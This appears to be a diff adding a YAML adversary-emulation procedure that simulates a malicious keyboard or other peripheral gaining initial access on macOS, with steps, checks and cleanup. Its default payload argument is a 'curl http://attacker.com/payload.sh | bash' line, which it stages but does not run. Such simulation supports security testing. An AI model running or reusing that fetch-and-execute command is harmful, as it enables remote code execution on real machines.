@@ -1,0 +1,86 @@
+id: ttp-042
+name: Malicious Peripheral Connection
+uuid: 550e8400-e29b-41d4-a716-446655440042
+api_version: '2.0'
+platform: darwin
+category: initial_access
+description: Simulate connection of malicious peripheral device (keyboard, mouse, etc.) to establish initial access
+author: TTPs Generator
+created: 2026-01-30
+
+args:
+  - name: target_device
+    description: Target macOS device to compromise
+    type: string
+    default: 'localhost'
+  - name: peripheral_type
+    description: Type of malicious peripheral (keyboard, mouse, network_adapter)
+    type: string
+    default: keyboard
+  - name: peripheral_id
+    description: Device identifier for malicious peripheral
+    type: string
+    default: '0x1234:0x5678'
+  - name: command_payload
+    description: Command to execute via malicious peripheral
+    type: string
+    default: 'curl http://attacker.com/payload.sh | bash'
+
+steps:
+  - name: Detect peripheral devices
+    description: Enumerate connected peripheral devices
+    executor: sh
+    command: 'system_profiler SPUSBDataType SPBluetoothDataType 2>/dev/null | grep -i "device\|peripheral" | head -10 || echo "Peripheral enumeration completed"'
+  
+  - name: Emulate peripheral connection
+    description: Simulate malicious peripheral connecting
+    executor: sh
+    command: 'echo "Peripheral Connected: ${peripheral_type} (${peripheral_id}) at $(date)" >> /tmp/peripheral_connection.log'
+  
+  - name: Stage malicious payload
+    description: Stage payload for peripheral to inject
+    executor: sh
+    command: 'echo "${command_payload}" > /tmp/peripheral_payload.sh && chmod +x /tmp/peripheral_payload.sh'
+  
+  - name: Simulate keystroke injection
+    description: Simulate keystroke injection attack
+    executor: sh
+    command: 'echo "Injecting keystrokes from peripheral ${peripheral_type}" >> /tmp/peripheral_connection.log'
+  
+  - name: Monitor device activity
+    description: Check for malicious peripheral activity
+    executor: sh
+    command: 'ls -la /tmp/peripheral* 2>/dev/null | wc -l'
+
+checks:
+  - name: Peripheral connection logging
+    description: Verify peripheral connection was logged
+    executor: sh
+    command: 'test -f /tmp/peripheral_connection.log && echo "PASS: Connection logged" || echo "FAIL: No connection log"'
+  
+  - name: Payload delivery verification
+    description: Verify payload was staged for delivery
+    executor: sh
+    command: 'test -f /tmp/peripheral_payload.sh && echo "PASS: Payload staged" || echo "FAIL: Payload not found"'
+  
+  - name: Keystroke injection confirmation
+    description: Verify keystroke injection simulation
+    executor: sh
+    command: 'grep -q "Injecting" /tmp/peripheral_connection.log 2>/dev/null && echo "PASS: Injection recorded" || echo "FAIL: No injection recorded"'
+
+tests:
+  - name: Peripheral connection test
+    description: Test malicious peripheral connection
+    dry_run: true
+    command: 'echo "DRY RUN: Would connect malicious ${peripheral_type} peripheral with ID ${peripheral_id}"'
+
+cleanup:
+  - name: Remove connection logs
+    description: Clean up peripheral connection simulation logs
+    executor: sh
+    command: 'rm -f /tmp/peripheral_connection.log'
+  
+  - name: Remove payload artifacts
+    description: Clean up staged malicious payloads
+    executor: sh
+    command: 'rm -f /tmp/peripheral_payload.sh'
